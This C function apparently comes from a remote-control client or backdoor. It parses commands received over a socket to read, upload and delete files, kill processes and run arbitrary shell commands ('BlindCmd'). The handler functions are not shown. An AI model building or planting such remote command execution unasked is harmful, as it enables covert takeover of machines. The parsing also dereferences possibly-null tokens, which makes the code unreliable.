
void CommandParser(char *BufferToParse,SOCKET Connection){
    char *CommandToken = NULL;
    CommandToken = strtok(BufferToParse," ");


    if(strcmp(CommandToken,"WriteFile") == 0){
        ExecuteFileWrite(Connection);
    }
    else{
        BufferToParse[strcspn(BufferToParse,"\n")] = '\0';
    }

    if(strcmp(CommandToken,"ReadFile") == 0){
        CommandToken = strtok(NULL," ");
        if(CommandToken != NULL){
            ExecuteFileRead(CommandToken,Connection);
        }
    }
    if(strcmp(CommandToken,"DeleteFile") == 0){
        CommandToken = strtok(NULL," ");
        if(CommandToken != NULL){
            ExecuteRemoveFile(CommandToken);
        }
    }
    if(strcmp(CommandToken,"MoveFile") == 0){
        ExecuteMoveFile();
    }
    if(strcmp(CommandToken,"FileSize") == 0){
        CommandToken = strtok(NULL,"\"");
        if(CommandToken != NULL){
            ExecuteFileSize(CommandToken,Connection);
        }
    }

    if(strcmp(CommandToken,"CurrentDirectory") == 0){
        ExecuteCurrentDirectory(Connection);
    }

    if(strcmp(CommandToken,"ListDirectory") == 0){
        char *OriginPath = strtok(NULL,"\"");
        ExecuteListDirectory(OriginPath,Connection);
    }

    if(strcmp(CommandToken,"Beep") == 0){
        ExecuteBeepBeep();
    }

    if(strcmp(CommandToken,"ListProcess") == 0){
        ExecuteListProcess(Connection);
    }

    if(strcmp(CommandToken,"KillProcess") == 0){
        char *ProcessName = strtok(NULL,"\"");

        if(ProcessName != NULL){
            ExecuteProcessKill(ProcessName);
        }
    }

    if(strcmp(CommandToken,"BlindCmd") == 0){
        char *CmdCode = strtok(NULL,"");
        if(CmdCode != NULL){
            ExecuteBlindCmdExecution(CmdCode);
        }
    }

    if(strcmp(CommandToken,"UploadFile") == 0){

        char *FileName = strtok(NULL,"\"");

        int FileSize = 0;
        FileSize = atoi(strtok(NULL," "));

        printf("%d\n",FileSize);

        if(FileName != NULL && FileSize != 0){
            ExecuteUploadFile(FileName,FileSize,Connection);
        }
    }

    if(strcmp(CommandToken,"PortalIntegration") == 0){
        ExecutePortalIntegration(Connection);
    }
}